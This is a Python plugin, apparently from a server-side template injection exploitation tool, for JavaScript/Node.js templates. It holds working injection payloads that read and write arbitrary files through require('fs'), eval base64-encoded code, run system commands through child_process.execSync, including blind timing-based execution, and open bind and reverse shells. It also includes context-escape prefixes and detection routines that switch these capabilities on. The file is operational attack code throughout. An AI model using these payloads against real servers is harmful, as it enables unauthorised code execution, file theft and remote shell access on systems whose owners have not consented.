from utils.strings import quote, chunkit, md5
from utils.loggers import log
from core import languages
from core.plugin import Plugin
from utils import rand
import base64
import re


class Javascript(Plugin):

    actions = {
        'render' : {
            'call': 'inject',
            'render': """%(code)s""",
            'header': """'%(header)s'+""",
            'trailer': """+'%(trailer)s'""",
            'render_test': 'typeof(%(r1)s)+%(r2)s' % { 
                'r1' : rand.randints[0],
                'r2' : rand.randints[1]
            },
            'render_expected': 'number%(r2)s' % { 
                'r2' : rand.randints[1]
            }
        },
        # No evaluate_blind here, since we've no sleep, we'll use inject
        'write' : {
            'call' : 'inject',
            'write' : """require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')""",
            'truncate' : """require('fs').writeFileSync('%(path)s', '')"""
        },
        'read' : {
            'call': 'render',
            'read' : """require('fs').readFileSync('%(path)s').toString('base64')"""
        },
        'md5' : {
            'call': 'render',
            'md5': """require('crypto').createHash('md5').update(require('fs').readFileSync('%(path)s')).digest("hex")"""
        },
        'evaluate' : {
            'call': 'render',
            'evaluate': """eval(Buffer('%(code_b64)s', 'base64').toString())"""
        },
        'blind' : {
            'call': 'execute_blind',
            'bool_true' : 'true',
            'bool_false' : 'false'
        },
        # Not using execute here since it's rendered and requires set headers and trailers
        'execute_blind' : {
            'call': 'inject',
            # execSync() has been introduced in node 0.11, so this will not work with old node versions.
            # TODO: use another function.
            'execute_blind': """require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i')//"""
        },
        'execute' : {
            'call': 'render',
            'execute': """require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString())"""
        },
        'bind_shell' : {
            'call' : 'execute_blind',
            'bind_shell': languages.bash_bind_shell
        },
        'reverse_shell' : {
            'call': 'execute_blind',
            'reverse_shell' : languages.bash_reverse_shell
        }
    }

    contexts = [

        # Text context, no closures
        { 'level': 0 },

        # This terminates the statement with ;
        { 'level': 1, 'prefix' : '%(closure)s;', 'suffix' : '//', 'closures' : languages.javascript_ctx_closures },

        # This does not need termination e.g. if(%s) {}
        { 'level': 2, 'prefix' : '%(closure)s', 'suffix' : '//', 'closures' : languages.javascript_ctx_closures },

        # Comment blocks
        { 'level': 5, 'prefix' : '*/', 'suffix' : '/*' },

    ]

    language = 'javascript'

    def rendered_detected(self):

        os = self.evaluate("""require('os').platform()""")
        if os and re.search('^[\w-]+$', os):
            self.set('os', os)
            self.set('evaluate', self.language)
            self.set('write', True)
            self.set('read', True)

            expected_rand = str(rand.randint_n(2))
            
            if expected_rand == self.execute('echo %s' % expected_rand):
                self.set('execute', True)
                self.set('bind_shell', True)
                self.set('reverse_shell', True)


    def blind_detected(self):

        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
            self.set('execute_blind', True)
            self.set('write', True)
            self.set('bind_shell', True)
            self.set('reverse_shell', True)
